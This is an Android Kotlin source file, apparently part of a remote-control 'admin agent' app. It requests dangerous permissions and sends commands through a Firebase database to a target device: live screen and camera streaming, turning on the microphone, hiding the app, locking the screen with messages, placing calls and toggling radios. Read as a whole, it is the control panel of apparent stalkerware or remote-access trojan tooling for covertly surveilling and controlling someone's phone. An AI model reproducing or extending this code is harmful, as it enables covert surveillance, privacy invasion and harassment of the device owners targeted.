// File #5: /app/src/main/java/com/unify/adminagent/AdminActivity.kt
package com.unify.adminagent

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.google.firebase.database.FirebaseDatabase

class AdminActivity : AppCompatActivity() {
    private lateinit var dbRef: com.google.firebase.database.DatabaseReference

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_admin)

        // Init Firebase with the provided config (already in google-services.json)
        dbRef = FirebaseDatabase.getInstance().getReference("commands")

        // Request all dangerous permissions
        val perms = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.SYSTEM_ALERT_WINDOW,
            Manifest.permission.CAMERA
        )
        ActivityCompat.requestPermissions(this, perms, 1001)

        // --- Bind UI ---
        val btnFlash = findViewById<Button>(R.id.btnFlash)
        val etVideo = findViewById<EditText>(R.id.etVideoUrl)
        val btnPlay = findViewById<Button>(R.id.btnPlayVideo)
        val btnWall = findViewById<Button>(R.id.btnWallpaper)
        val etMin = findViewById<EditText>(R.id.etLockMinutes)
        val btnLock = findViewById<Button>(R.id.btnLock)
        val etMinV2 = findViewById<EditText>(R.id.etLockV2Minutes)
        val etMsg = findViewById<EditText>(R.id.etAlertMsg)
        val btnLockV2 = findViewById<Button>(R.id.btnLockV2)
        val btnLiveScr = findViewById<Button>(R.id.btnLiveScreen)
        val btnLiveCam = findViewById<Button>(R.id.btnLiveCamera)
        val swHide = findViewById<Switch>(R.id.swHideApp)
        val tvModel = findViewById<TextView>(R.id.tvDeviceModel)
        val tvIP = findViewById<TextView>(R.id.tvIP)
        val tvLoc = findViewById<TextView>(R.id.tvLocation)
        val btnRef = findViewById<Button>(R.id.btnRefreshInfo)
        val swWifi = findViewById<Switch>(R.id.swWifi)
        val swData = findViewById<Switch>(R.id.swData)
        val swBt = findViewById<Switch>(R.id.swBluetooth)
        val swGps = findViewById<Switch>(R.id.swLocation)
        val etPhone = findViewById<EditText>(R.id.etPhoneNumber)
        val btnCall = findViewById<Button>(R.id.btnCall)
        val btnMic = findViewById<Button>(R.id.btnMicOn)

        // Send command function
        fun sendCmd(key: String, value: Any) {
            dbRef.child(key).setValue(value)
            Toast.makeText(this, "Sent: $key", Toast.LENGTH_SHORT).show()
        }

        // Click listeners
        btnFlash.setOnClickListener { sendCmd("flash", "toggle") }
        btnPlay.setOnClickListener { sendCmd("video", etVideo.text.toString()) }
        btnWall.setOnClickListener { sendCmd("wallpaper", "trigger") }
        btnLock.setOnClickListener { sendCmd("lock", mapOf("minutes" to etMin.text.toString().toIntOrNull() ?: 1, "type" to "v1")) }
        btnLockV2.setOnClickListener {
            sendCmd("lock_v2", mapOf(
                "minutes" to (etMinV2.text.toString().toIntOrNull() ?: 1),
                "alert" to etMsg.text.toString()
            ))
        }
        btnLiveScr.setOnClickListener { sendCmd("live", "screen") }
        btnLiveCam.setOnClickListener { sendCmd("live", "camera") }
        swHide.setOnCheckedChangeListener { _, isChecked -> sendCmd("hide_app", isChecked) }

        swWifi.setOnCheckedChangeListener { _, isChecked -> sendCmd("toggle_wifi", isChecked) }
        swData.setOnCheckedChangeListener { _, isChecked -> sendCmd("toggle_data", isChecked) }
        swBt.setOnCheckedChangeListener { _, isChecked -> sendCmd("toggle_bluetooth", isChecked) }
        swGps.setOnCheckedChangeListener { _, isChecked -> sendCmd("toggle_location", isChecked) }

        btnCall.setOnClickListener { sendCmd("call", etPhone.text.toString()) }
        btnMic.setOnClickListener { sendCmd("mic_on", "enable") }

        // Device Info default (will be updated via Agent later)
        tvModel.text = android.os.Build.MODEL
        tvIP.text = "IP: Fetching..."
        tvLoc.text = "Location: Fetching..."
    }
}